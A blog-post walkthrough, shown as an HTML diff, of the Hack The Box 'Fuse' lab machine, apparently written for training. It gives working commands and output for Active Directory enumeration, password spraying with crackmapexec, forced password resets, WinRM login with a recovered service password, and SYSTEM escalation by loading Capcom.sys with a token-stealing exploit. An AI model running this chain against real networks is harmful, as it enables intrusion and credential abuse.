@@ -1,0 +1,620 @@
+<!DOCTYPE html>
+<html lang="en-us">
+
+  <head>
+  <link href="http://gmpg.org/xfn/11" rel="profile">
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+
+  <title>
+    
+      FUSE - Walkthrough &middot; R0cK - Blog
+    
+  </title>
+
+  
+  <link rel="canonical" href="http://localhost:2222/2020/10/05/fuse/">
+  
+
+  <link rel="stylesheet" href="http://localhost:2222/public/css/poole.css">
+  <link rel="stylesheet" href="http://localhost:2222/public/css/syntax.css">
+  <link rel="stylesheet" href="http://localhost:2222/public/css/lanyon.css">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=PT+Serif:400,400italic,700%7CPT+Sans:400">
+
+  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="http://localhost:2222/public/apple-touch-icon-precomposed.png">
+  <link rel="shortcut icon" href="http://localhost:2222/public/favicon.ico">
+
+  <link rel="alternate" type="application/rss+xml" title="RSS" href="http://localhost:2222/atom.xml">
+
+  
+</head>
+
+
+  <body class="theme-base-11">
+
+    <!-- Target for toggling the sidebar `.sidebar-checkbox` is for regular
+     styles, `#sidebar-checkbox` for behavior. -->
+<input type="checkbox" class="sidebar-checkbox" id="sidebar-checkbox">
+
+<!-- Toggleable sidebar -->
+<div class="sidebar" id="sidebar">
+  <div class="sidebar-item">
+  </div>
+  <div class="sidebar-item">
+    <img src="/images/logo_003.png" />
+    <p>Blog about cyber security. CTF stuff on hackthebox and tryhackme.</p>
+  </div>
+
+  <nav class="sidebar-nav">
+    <a class="sidebar-nav-item" href="http://localhost:2222/">Home</a>
+
+    
+
+    
+    
+      
+        
+      
+    
+      
+        
+      
+    
+      
+        
+          <a class="sidebar-nav-item" href="http://localhost:2222/about/">About</a>
+        
+      
+    
+      
+    
+
+    <a class="sidebar-nav-item" href="/archive/v1.1.0.zip">Download</a>
+    <a class="sidebar-nav-item" href="">GitHub project</a>
+    <span class="sidebar-nav-item">Currently v1.1.0</span>
+  </nav>
+
+  <div class="sidebar-item">
+    <p>
+      &copy; 2020. All rights reserved.
+    </p>
+  </div>
+</div>
+
+
+    <!-- Wrap is the content to shift when toggling the sidebar. We wrap the
+         content to avoid any CSS collisions with our real content. -->
+    <div class="wrap">
+      <div class="masthead">
+        <div class="container">
+          <h3 class="masthead-title">
+            <a href="/" title="Home">R0cK - Blog</a>
+            <small>R0cK Blog</small>
+          </h3>
+        </div>
+      </div>
+
+      <div class="container content">
+        <div class="post">
+  <h1 class="post-title">FUSE - Walkthrough</h1>
+  <span class="post-date">05 Oct 2020</span>
+  <p>Fuse was very interesting. It requires to make a good enumeration but also to a have keen eye for details and a good understanding of what you’re doing overall. The root part is pretty straigthforward once you kwnow how to use the exploit properly. Very fun box!</p>
+
+<h2 id="recon">Recon</h2>
+
+<p>I start with a quick Nmap followed by a full scan with the default script (-C) and the -V tag to get more info about the services.</p>
+
+<figure class="highlight"><pre><code class="language-sh" data-lang="sh"><span class="nb">sudo </span>nmap fuse <span class="o">&amp;&amp;</span> <span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p-</span> fuse <span class="nt">-oN</span> nmap</code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-05 05:15 EST
+Nmap scan report for fuse (10.10.10.193)
+Host is up (0.097s latency).
+Not shown: 988 filtered ports
+PORT     STATE SERVICE
+53/tcp   open  domain
+80/tcp   open  http
+88/tcp   open  kerberos-sec
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+389/tcp  open  ldap
+445/tcp  open  microsoft-ds
+464/tcp  open  kpasswd5
+593/tcp  open  http-rpc-epmap
+636/tcp  open  ldapssl
+3268/tcp open  globalcatLDAP
+3269/tcp open  globalcatLDAPssl
+
+Nmap done: 1 IP address (1 host up) scanned in 5.72 seconds</code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-05 04:45 EST
+Nmap scan report for fuse (10.10.10.193)
+Host is up (0.094s latency).
+Not shown: 65514 filtered ports
+PORT      STATE SERVICE      VERSION
+53/tcp    open  domain       Simple DNS Plus
+80/tcp    open  http         Microsoft IIS httpd 10.0
+PORT      STATE SERVICE      VERSION
+53/tcp    open  domain       Simple DNS Plus
+80/tcp    open  http         Microsoft IIS httpd 10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Site doesn\'t have a title (text/html).
+88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2020-11-05 10:03:48Z)
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: fabricorp.local, Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: FABRICORP)
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: fabricorp.local, Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf       .NET Message Framing
+49666/tcp open  msrpc        Microsoft Windows RPC
+49667/tcp open  msrpc        Microsoft Windows RPC
+49675/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+49676/tcp open  msrpc        Microsoft Windows RPC
+49680/tcp open  msrpc        Microsoft Windows RPC
+49694/tcp open  msrpc        Microsoft Windows RPC
+49701/tcp open  msrpc        Microsoft Windows RPC
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+Host script results:
+|_clock-skew: mean: 2h55m04s, deviation: 4h37m09s, median: 15m02s
+| smb-os-discovery: 
+|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
+|   Computer name: Fuse
+|   NetBIOS computer name: FUSE\x00
+|   Domain name: fabricorp.local
+|   Forest name: fabricorp.local
+|   FQDN: Fuse.fabricorp.local
+|_  System time: 2020-11-05T02:04:41-08:00
+| smb-security-mode: 
+|   account_used: &lt;blank&gt;
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: required
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2020-11-05T10:04:40
+|_  start_date: 2020-11-05T09:45:42
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 287.84 seconds</code></pre></figure>
+
+<p>As you can see we have a bunch of ports open and the full scan reveals more informations :</p>
+
+<ul>
+  <li>OS: Windows 2016</li>
+  <li>Web Server: IIS 10.0</li>
+  <li>Domain name: fabricorp.local</li>
+  <li>FQDN: fuse.fabricorp.local</li>
+</ul>
+
+<p>Also WinRM (5985) is open, which can be very useful to get a foothold.</p>
+
+<p>The first thing I do is adding the domain name my hosts file.</p>
+
+<figure class="highlight"><pre><code class="language-sh" data-lang="sh">127.0.0.1	localhost
+127.0.1.1	kali
+
+<span class="c"># The following lines are desirable for IPv6 capable hosts
+</span>
+::1     localhost ip6-localhost ip6-loopback
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+
+10.10.10.193	fuse fabricorp.local fuse.fabricorp.local</code></pre></figure>
+
+<p>Then I’d like to poke around with smb and other services but first lets have a look at port 80.</p>
+
+<p>We know that we have a web server running so we can use nikto to gather useful informations from the server.</p>
+
+<figure class="highlight"><pre><code class="language-sh" data-lang="sh">nikto <span class="nt">-h</span> http://fabricorp.local</code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          10.10.10.193
++ Target Hostname:    fabricorp.local
++ Target Port:        80
++ Start Time:         2020-11-05 06:50:52 (GMT-5)
+---------------------------------------------------------------------------
++ Server: Microsoft-IIS/10.0
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST 
++ Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST 
++ 7785 requests: 0 error(s) and 5 item(s) reported on remote host
++ End Time:           2020-11-05 07:04:02 (GMT-5) (790 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested</code></pre></figure>
+
+<p>Nothing very interesting so lets open firefox and check the website manualy.</p>
+
+<p>It seems to be some kind of print server. I don’t know Papercut so I tried to google it but I didn’t 
+find any vuln. Then I made some basic enumeration and again, didn’t find anything except these log files on the home page.</p>
+
+<h2 id="foothold--user">Foothold / User</h2>
+
+<p>I used <strong><cite>Olevba</cite></strong> to analyze the files and got a few users and filenames.</p>
+
+<figure class="highlight"><pre><code class="language-sh" data-lang="sh">olevba papercut-print-log-2020-05.csv</code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">olevba 0.55.1 on Python 3.8.6 - http://decalage.info/python/oletools
+===============================================================================
+FILE: papercut-print-log-2020-05.csv
+Type: Text
+-------------------------------------------------------------------------------
+VBA MACRO papercut-print-log-2020-05.csv 
+in file: papercut-print-log-2020-05.csv - OLE stream: ''
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+PaperCut Print Logger - http://www.papercut.com/
+Time,User,Pages,Copies,Printer,Document Name,Client,Paper Size,Language,Height,Width,Duplex,Grayscale,Size
+2020-05-29 17:50:10,pmerton,1,1,HP-MFT01,"New Starter - bnielson - Notepad",JUMP01,LETTER,PCL6,,,NOT DUPLEX,GRAYSCALE,19kb,
+2020-05-29 17:53:55,tlavel,1,1,HP-MFT01,"IT Budget Meeting Minutes - Notepad",LONWK015,LETTER,PCL6,,,NOT DUPLEX,GRAYSCALE,52kb,
+2020-05-30 16:37:45,sthompson,1,1,HP-MFT01,"backup_tapes - Notepad",LONWK019,LETTER,PCL6,,,NOT DUPLEX,GRAYSCALE,20kb,
+2020-05-30 16:42:19,sthompson,1,1,HP-MFT01,"mega_mountain_tape_request.pdf",LONWK019,LETTER,PCL6,,,NOT DUPLEX,GRAYSCALE,104kb,
+2020-05-30 17:07:06,sthompson,1,1,HP-MFT01,"Fabricorp01.docx - Word",LONWK019,LETTER,PCL6,,,NOT DUPLEX,GRAYSCALE,153kb,
++----------+--------------------+---------------------------------------------+
+|Type      |Keyword             |Description                                  |
++----------+--------------------+---------------------------------------------+
+|IOC       |http://www.papercut.|URL                                          |
+|          |com/                |                                             |
++----------+--------------------+---------------------------------------------+</code></pre></figure>
+
+<h3 id="usernames">Usernames</h3>
+
+<ul>
+  <li>sthompson</li>
+  <li>pmerton</li>
+  <li>tlavel</li>
+  <li>bhult</li>
+  <li>administrator</li>
+  <li>bnielson</li>
+</ul>
+
+<p>Because port 88 (kerberos) is open, I can use Kerbrute and verify the usernames I found in log files.</p>
+
+<figure class="highlight"><pre><code class="language-sh" data-lang="sh">~/toolbox/kerbrute/dist/kerbrute_linux_amd64 userenum <span class="nt">-d</span> fabricorp.local <span class="nt">--dc</span> fuse <span class="nb">users</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: dev (9dad6e1) - 11/05/20 - Ronnie Flathers @ropnop
+
+2020/11/05 08:33:06 &gt;  Using KDC(s):
+2020/11/05 08:33:06 &gt;  	fuse:88
+
+2020/11/05 08:33:06 &gt;  [+] VALID USERNAME:	 administrator@fabricorp.local
+2020/11/05 08:33:06 &gt;  [+] VALID USERNAME:	 pmerton@fabricorp.local
+2020/11/05 08:33:06 &gt;  [+] VALID USERNAME:	 sthompson@fabricorp.local
+2020/11/05 08:33:06 &gt;  [+] VALID USERNAME:	 bhult@fabricorp.local
+2020/11/05 08:33:06 &gt;  [+] VALID USERNAME:	 tlavel@fabricorp.local
+2020/11/05 08:33:06 &gt;  [+] VALID USERNAME:	 bnielson@fabricorp.local
+2020/11/05 08:33:06 &gt;  Done! Tested 6 usernames (6 valid) in 0.092 seconds</code></pre></figure>
+
+<p>Every users are valid users but I can’t go further with kerberos because I don’t have any password for these users.</p>
+
+<p>There is an interesting file called <strong><cite>‘New Starter - bnielson’</cite></strong> and another one called <strong><cite>‘Fabricorp01.docx’</cite></strong>. I should investigate and check if the user bnielson has some sort of default password.</p>
+
+<p>I should’ve tried directly the password Fabricorp01 but for some reasons it didn’t poped in my head so I tried different password lists but nothing worked. I decided to create a custom list based on the domain name (fabricorp).</p>
+
+<p>For that, I used hashcat.</p>
+
+<figure class="highlight"><pre><code class="language-sh" data-lang="sh"><span class="nb">echo</span> <span class="s2">"fabricorp"</span> <span class="o">&gt;</span> tmp-password <span class="o">&amp;&amp;</span> <span class="nb">cat </span>tmp-password
+fabricorp</code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-sh" data-lang="sh">hashcat <span class="nt">--force</span> <span class="nt">--stdout</span> tmp-password <span class="nt">-r</span> /usr/share/hashcat/rules/best64.rule <span class="nt">-r</span> /usr/share/hashcat/rules/toggles1.rule <span class="o">&gt;</span> tmp-passwords <span class="o">&amp;&amp;</span> <span class="nb">wc</span> <span class="nt">-l</span> tmp-passwords
+1155 tmp-passwords</code></pre></figure>
+
+<p>Then I used <strong><cite>crackmapexec</cite></strong> to brute force the password for user bnielson.</p>
+
+<figure class="highlight"><pre><code class="language-sh" data-lang="sh">crackmapexec smb fuse <span class="nt">-u</span> bnielson <span class="nt">-p</span> passwords</code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\bnielson:Fabricorp6 STATUS_LOGON_FAILURE 
+SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\bnielson:Fabricorp7 STATUS_LOGON_FAILURE 
+SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\bnielson:Fabricorp8 STATUS_LOGON_FAILURE 
+SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\bnielson:Fabricorp9 STATUS_LOGON_FAILURE 
+SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\bnielson:Fabricorp00 STATUS_LOGON_FAILURE 
+SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\bnielson:Fabricorp01 STATUS_PASSWORD_MUST_CHANGE 
+SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\bnielson:Fabricorp02 STATUS_LOGON_FAILURE 
+SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\bnielson:Fabricorp11 STATUS_LOGON_FAILURE 
+SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\bnielson:Fabricorp12 STATUS_LOGON_FAILURE 
+SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\bnielson:Fabricorp13 STATUS_LOGON_FAILURE</code></pre></figure>
+
+<p>Interestringly, if we use the password <strong>Fabricorp01</strong>, we get the message <strong><cite>STATUS_PASSWORD_MUST_CHANGE</cite></strong>.</p>
+
+<p>That happens because the user bnielson is suppose to change his password the first time he connects to the domain. Apparently here, bnielson didn’t connect to the domain yet.</p>
+
+<p>Let’s see if other users have the same response from crackmapexec.</p>
+
+<figure class="highlight"><pre><code class="language-sh" data-lang="sh">crackmapexec smb fuse <span class="nt">-u</span> <span class="nb">users</span> <span class="nt">-p</span> <span class="s1">'Fabricorp01'</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">SMB         10.10.10.193    445    FUSE             [*] Windows Server 2016 Standard 14393 (name:FUSE) (domain:fabricorp.local) (signing:True) (SMBv1:True)
+SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\sthompson:Fabricorp01 STATUS_LOGON_FAILURE 
+SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\pmerton:Fabricorp01 STATUS_LOGON_FAILURE 
+SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\tlavel:Fabricorp01 STATUS_PASSWORD_MUST_CHANGE 
+SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\bhult:Fabricorp01 STATUS_PASSWORD_MUST_CHANGE 
+SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\administrator:Fabricorp01 STATUS_LOGON_FAILURE 
+SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\bnielson:Fabricorp01 STATUS_PASSWORD_MUST_CHANGE </code></pre></figure>
+
+<p><strong><em>Tlavel</em></strong>, <strong><em>bnielson</em></strong> and <strong><em>bhult</em></strong> have the same status. I’m gonna modify change the password for bnielson.</p>
+
+<figure class="highlight"><pre><code class="language-sh" data-lang="sh">smbpasswd <span class="nt">-r</span> 10.10.10.193 <span class="nt">-U</span> bnielson</code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-sh" data-lang="sh">crackmapexec smb fuse <span class="nt">-u</span> bnielson <span class="nt">-p</span> <span class="s1">'ThanksF0rReading'</span> <span class="nt">--shares</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">SMB         10.10.10.193    445    FUSE             [*] Windows Server 2016 Standard 14393 (name:FUSE) (domain:fabricorp.local) (signing:True) (SMBv1:True)
+SMB         10.10.10.193    445    FUSE             [+] fabricorp.local\bnielson:ThanksF0rReading 
+SMB         10.10.10.193    445    FUSE             [+] Enumerated shares
+SMB         10.10.10.193    445    FUSE             Share           Permissions     Remark
+SMB         10.10.10.193    445    FUSE             -----           -----------     ------
+SMB         10.10.10.193    445    FUSE             ADMIN$                          Remote Admin
+SMB         10.10.10.193    445    FUSE             C$                              Default share
+SMB         10.10.10.193    445    FUSE             HP-MFT01                        HP-MFT01
+SMB         10.10.10.193    445    FUSE             IPC$                            Remote IPC
+SMB         10.10.10.193    445    FUSE             NETLOGON        READ            Logon server share 
+SMB         10.10.10.193    445    FUSE             print$          READ            Printer Drivers
+SMB         10.10.10.193    445    FUSE             SYSVOL          READ            Logon server share </code></pre></figure>
+
+<p>It works ! We have now access to the shares but after a few minutes, the passwords is being reseted and I can’t access to the shares anymore. Maybe I should try another user. Let’s try with tlavel and bhult.</p>
+
+<p>The same problem happens !</p>
+
+<p>Some kind of process reset all the passords after one or two minutes so I guess we just need to be quick to connect to smb. Also we need to put a different password everytime we change it because it keeps track of the old passwords.</p>
+
+<figure class="highlight"><pre><code class="language-sh" data-lang="sh"><span class="o">(</span><span class="nb">echo </span>Fabricorp01<span class="p">;</span> <span class="nb">echo </span>ThanksF0rReading1111<span class="p">;</span> <span class="nb">echo </span>ThanksF0rReading1111<span class="o">)</span> | smbpasswd <span class="nt">-s</span> <span class="nt">-r</span> 10.10.10.193 <span class="nt">-U</span> tlavel</code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-sh" data-lang="sh">smbpasswd <span class="nt">-r</span> 10.10.10.193 <span class="nt">-U</span> bnielson</code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-sh" data-lang="sh">smbclient <span class="nt">-U</span> <span class="s1">'tlavel'</span> //10.10.10.193/SYSVOL</code></pre></figure>
+
+<p>After a bit of borring smb enumeration, I didn’t find anything very userful so I’m gonna move on with rpc and see what we’ll get.</p>
+
+<figure class="highlight"><pre><code class="language-sh" data-lang="sh"><span class="o">(</span><span class="nb">echo </span>Fabricorp01<span class="p">;</span> <span class="nb">echo </span>ThanksF0rReading222<span class="p">;</span> <span class="nb">echo </span>ThanksF0rReading222<span class="o">)</span> | smbpasswd <span class="nt">-s</span> <span class="nt">-r</span> 10.10.10.193 <span class="nt">-U</span> tlavel</code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-sh" data-lang="sh">rpcclient <span class="nt">-U</span> <span class="s1">'tlavel%ThanksF0rReading222'</span> fuse</code></pre></figure>
+
+<p>Rpcclient gives us more users. Let’s grab these and keep them in a file.</p>
+
+<figure class="highlight"><pre><code class="language-sh" data-lang="sh">enumdomusers</code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-sh" data-lang="sh">user:[Administrator] rid:[0x1f4]
+user:[Guest] rid:[0x1f5]
+user:[krbtgt] rid:[0x1f6]
+user:[DefaultAccount] rid:[0x1f7]
+user:[svc-print] rid:[0x450]
+user:[bnielson] rid:[0x451]
+user:[sthompson] rid:[0x641]
+user:[tlavel] rid:[0x642]
+user:[pmerton] rid:[0x643]
+user:[svc-scan] rid:[0x645]
+user:[bhult] rid:[0x1bbd]
+user:[dandrews] rid:[0x1bbe]
+user:[mberbatov] rid:[0x1db1]
+user:[astein] rid:[0x1db2]
+user:[dmuir] rid:[0x1db3]</code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-sh" data-lang="sh"><span class="nb">cat </span>tmp-users | <span class="nb">awk</span> <span class="nt">-F</span><span class="s1">'[][]'</span> <span class="s1">'{print $2}'</span> | <span class="nb">sed</span> <span class="s1">'/^$/d'</span> | <span class="nb">tee </span>rpc-users</code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-sh" data-lang="sh">Administrator
+Guest
+krbtgt
+DefaultAccount
+svc-print
+bnielson
+sthompson
+tlavel
+pmerton
+svc-scan
+bhult
+dandrews
+mberbatov
+astein
+dmuir</code></pre></figure>
+
+<p>I removed Ghuest, krbtgt and DefaultAccount from the list.</p>
+
+<p>Because we are on a print server, it worths to check the printers via rpcclient.</p>
+
+<figure class="highlight"><pre><code class="language-sh" data-lang="sh">enumprinters</code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">	flags:[0x800000]
+	name:[\\FUSE\HP-MFT01]
+	description:[\\FUSE\HP-MFT01,HP Universal Printing PCL 6,Central (Near IT, scan2docs password: $fab@s3Rv1ce$1)]
+	comment:[]</code></pre></figure>
+
+<p>Great! We found a password. 
+I’m gonna use that password with the user list that we got earlier.</p>
+
+<figure class="highlight"><pre><code class="language-sh" data-lang="sh">cme smb fuse <span class="nt">-u</span> rpc-users <span class="nt">-p</span> <span class="s1">'$fab@s3Rv1ce$1'</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">SMB         10.10.10.193    445    FUSE             [*] Windows Server 2016 Standard 14393 x64 (name:FUSE) (domain:fabricorp.local) (signing:True) (SMBv1:True)
+SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\Administrator:$fab@s3Rv1ce$1 STATUS_LOGON_FAILURE 
+SMB         10.10.10.193    445    FUSE             [+] fabricorp.local\svc-print:$fab@s3Rv1ce$1 </code></pre></figure>
+
+<p>There is match with the user <strong><cite>svc-print</cite></strong>.</p>
+
+<p>Let’s try cme again but this time with winrm instead of smb.</p>
+
+<figure class="highlight"><pre><code class="language-sh" data-lang="sh">cme winrm fuse <span class="nt">-u</span> rpc-users <span class="nt">-p</span> <span class="s1">'$fab@s3Rv1ce$1'</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">WINRM       10.10.10.193    5985   FUSE             [*] Windows 10.0 Build 14393 (name:FUSE) (domain:fabricorp.local)
+WINRM       10.10.10.193    5985   FUSE             [*] http://10.10.10.193:5985/wsman
+WINRM       10.10.10.193    5985   FUSE             [+] fabricorp.local\svc-print:$fab@s3Rv1ce$1 (Pwn3d!)</code></pre></figure>
+
+<p><strong>Pwn3d!</strong></p>
+
+<p>We can connect to the box with <strong><cite>evil-winrm</cite></strong>.</p>
+
+<figure class="highlight"><pre><code class="language-sh" data-lang="sh">evil-winrm <span class="nt">-i</span> 10.10.10.193 <span class="nt">-u</span> svc-print <span class="nt">-p</span> <span class="s1">'$fab@s3Rv1ce$1'</span></code></pre></figure>
+
+<p>The user flag is inside the desktop folder!</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">*Evil-WinRM* PS C:\Users\svc-print\Documents&gt; gci \users\svc-print\desktop
+
+
+    Directory: C:\users\svc-print\desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---        11/5/2020   1:46 AM             34 user.txt</code></pre></figure>
+
+<h2 id="root">Root</h2>
+
+<p>By looking at the privileges, I can see that <strong><cite>SeLoadDriverPrivilege</cite></strong> is enable for our user.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">*Evil-WinRM* PS C:\Users\svc-print\Documents&gt; whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeLoadDriverPrivilege         Load and unload device drivers Enabled
+SeShutdownPrivilege           Shut down the system           Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled</code></pre></figure>
+
+<p>A quick google search to find that <a href="https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/">article</a>.</p>
+
+<p>Basicaly, we have 2 steps to abuse that vulnerability:</p>
+
+<ul>
+  <li>Load a vulnerable driver (Capcom.sys) in the system;</li>
+  <li>Exploit the driver to get an elevated shell.</li>
+</ul>
+
+<h3 id="load-capcomsys-in-the-system">Load Capcom.sys in the system</h3>
+
+<p>To load the driver, we have to download the <a href="https://raw.githubusercontent.com/TarlogicSecurity/EoPLoadDriver/master/eoploaddriver.cpp">POC</a> from TarlogicSecurity.</p>
+
+<figure class="highlight"><pre><code class="language-sh" data-lang="sh">wget https://raw.githubusercontent.com/TarlogicSecurity/EoPLoadDriver/master/eoploaddriver.cpp.</code></pre></figure>
+
+<p>Then we need the <a href="https://github.com/GregoryGraindorge/ExploitCapcomMod/blob/main/Capcom.sys">driver</a>:</p>
+
+<figure class="highlight"><pre><code class="language-sh" data-lang="sh">wget https://github.com/GregoryGraindorge/ExploitCapcomMod/blob/main/Capcom.sys</code></pre></figure>
+
+<p>The EOPLoadDriver.cpp is not compiled yet so we have to do it ourselves. If you don’t know how to do that, there is a nice post <a href="https://stackoverflow.com/questions/19684190/how-to-compile-c-file-in-visual-studio">here</a>.</p>
+
+<p>Now that we have compiled the EOPLoadDriver.cpp as LoadDriver.exe, we can just upload everything on the target machine.</p>
+
+<p>Setup an SMB server.</p>
+
+<figure class="highlight"><pre><code class="language-sh" data-lang="sh"><span class="nb">sudo </span>smbserver.py rock <span class="nb">.</span> <span class="nt">-username</span> rock <span class="nt">-password</span> ThanksForReading <span class="nt">-smb2support</span></code></pre></figure>
+
+<p>Connect the target machine to the share.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">net use z: \\10.10.14.6\rock /USER:rock ThanksForReading</code></pre></figure>
+
+<p>Create a temp folder and copy LoadDriver.exe and Capcom.sys inside.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">cd \temp
+copy z:\LoadDriver.exe .
+copy z:\Capcom.sys .</code></pre></figure>
+
+<p>Load the driver inside the system. <strong>(Don’t use double backslash !!!)</strong></p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">C:\temp&gt; .\LoadDriver.exe System\CurrentControlSet\ThanksForReading C:\temp\Capcom.sys
+
+[+] Enabling SeLoadDriverPrivilege
+[+] SeLoadDriverPrivilege Enabled
+[+] Loading Driver: \Registry\User\S-1-5-21-2633719317-1471316042-3957863514-1104\System\CurrentControlSet\ThanksForReading
+NTSTATUS: c0000033, WinError: 0</code></pre></figure>
+
+<h3 id="exploit-the-driver">Exploit the driver</h3>
+
+<p>To abuse the driver, we need to use this <a href="https://github.com/tandasat/ExploitCapcom">exploit</a>.</p>
+
+<blockquote>
+  <p><em>This is a standalone exploit for a vulnerable feature in Capcom.sys. The feature is exposed through IOCTL and to execute an arbitrary user supplied function pointer with disabling SMEP. This exploit simply abuses the feature to perform token stealing to get the SYSTEM privileges, and then launches the command prompt with the elevated privilege.</em></p>
+</blockquote>
+
+<p>When running the exploit, it opens an elevated shell but the problem is that we don’t have a proper session on the target machine. Hence we need to adapt the exploit to fit our needs.</p>
+
+<p>I created a modified version of the exploit that you can find <a href="https://github.com/GregoryGraindorge/ExploitCapcomMod">here</a>. I already compiled it so if you don’t want to do it yourselve, juste download the latest release and run it on the target machine.</p>
+
+<p>Long story short, I just modified the last function of the original program to execute a command instead of spawning a new shell.</p>
+
+<p>To use it, download or compile ExploitCapcom.exe and upload it on the target machine. Then you can run a command like this:</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">.\ExploitCapcom.exe "whoami"
+
+[*] Capcom.sys exploit
+[*] Capcom.sys handle was obtained as 0000000000000064
+[*] Shellcode was placed at 000001D89AC60008
+[+] Shellcode was executed
+[+] Token stealing was successful
+nt authority\system</code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">.\ExploitCapcom.exe "type \users\administrator\desktop\root.txt"
+
+*Evil-WinRM* PS C:\temp&gt; .\ExploitCapcom.exe "type \users\administrator\desktop\root.txt"
+[*] Capcom.sys exploit
+[*] Capcom.sys handle was obtained as 0000000000000064
+[*] Shellcode was placed at 0000025BB0C20008
+[+] Shellcode was executed
+[+] Token stealing was successful
+a53127...</code></pre></figure>
+
+<p><strong>Rooted ;)</strong></p>
+
+</div>
+
+
+<div class="related">
+  <h2>Related posts</h2>
+  <ul class="related-posts">
+    
+      <li>
